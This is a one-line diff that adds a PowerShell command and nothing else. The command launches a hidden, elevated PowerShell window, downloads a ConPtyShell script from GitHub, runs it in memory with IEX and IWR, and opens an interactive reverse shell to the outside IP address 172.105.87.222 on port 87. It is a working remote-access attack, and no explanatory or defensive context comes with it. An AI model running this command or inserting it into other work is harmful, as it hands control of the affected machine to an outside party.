@@ -1,0 +1,1 @@
+start-process PowerShell -ArgumentList "PowerShell.exe -WindowStyle hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.105.87.222 87}" -verb runas
